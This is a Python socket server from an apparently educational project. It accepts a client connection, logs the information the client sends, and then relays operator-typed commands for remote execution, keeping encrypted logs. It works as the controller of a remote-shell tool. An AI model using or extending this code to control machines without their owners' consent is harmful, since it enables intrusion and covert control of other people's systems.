#!/usr/bin/python3
# -*- coding: utf-8 -*-

'''
    File name: server.py
    Author: MathIsSimple
    Python Version: 3.7.0
    Disclaimer: I created this project to learn about custom encoding and python sockets,
                this projected isn't made to be used for maliscious intent. Do so at your own risk
'''

# Import needed core python modules

import time
import socket
from sys import argv
from sys import path
from os  import mkdir

path.insert(0, './../lib/')

# Import needed custom python modules

from hasing      import encrypt, decrypt
from fileManager import getFilesInDir
from fileManager import createWritableFile

# Global Variables

PORT = 64500

# All of the functions needed for this project to work

def createConnexion(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen()
    conn, addr = sock.accept()

    return (sock, conn, addr)

def getTime():
    return int(round(time.time() * 1000))

def send(data):
    global f2
    global sendingCommands

    conn.sendall(encrypt(str(data)).encode())

    if sendingCommands == True:
        if data == "END":
            f2.close()

def receiveData():
    global receivingInfo
    global f1
    global f2

    rcv = decrypt(conn.recv(1024).decode("utf-8", "ignore"))

    if rcv != "END":
        if receivingInfo == True:
            f1.write(encrypt(rcv))
            f1.write("\n")
        else:
            f2.write(encrypt(rcv))
            f2.write("\n")
    else:
        if receivingInfo == True:
            f1.close()

    return rcv

def createLogs():
    log_dir = "./../logs/"
    try:
        mkdir(log_dir)
        print("Created Log Folder")
    except FileExistsError:
        print("Log Folder Already Exists")

    logs = getFilesInDir(log_dir)
    biggest_number = 0
    hadANumber     = False

    for log in logs:
        print(log)
        log_number = int(log[3:-4])
        if hadANumber == True:
            if log_number > biggest_number:
                biggest_number = log_number
        else:
            biggest_number = log_number
            hadANumber = True

    log_number = biggest_number + 1

    file_name1 = "inf"+str(log_number)+".txt"
    file_name2 = "log"+str(log_number)+".txt"
    f1 = createWritableFile(log_dir+file_name1)
    f2 = createWritableFile(log_dir+file_name2)

    return (f1, f2)

# Ask for the port if it hasn't been given as a command line argument

if len(argv) > 1:
    PORT = int(argv[1])
else:
    PORT = int(input("On which port do you want the server to be created on ? : "))

sock, conn, addr = createConnexion("127.0.0.1", PORT)

f1, f2 = createLogs()
print("Created Log")

receivingInfo   = True
sendingCommands = False

while True:
    if receivingInfo:
        received = receiveData()
        if received != "END":
            print(received)
        else:
            receivingInfo   = False
            sendingCommands = True
        
    if sendingCommands:
        command = input("Command To Execute ")
        if command != "END":
            f2.write(encrypt(command))
            f2.write("\n")
            send(command)
            last_rcv_time = getTime()

            while True:
                current_time = getTime()
                if (current_time - last_rcv_time >= 2000):
                    break
                    
                received = receiveData()
                if received != "":
                    last_rcv_time = getTime()
                    if received != "END":
                        print(received)
                    else:
                        break
        else:
            send("END")
            sock.close()
            exit(0)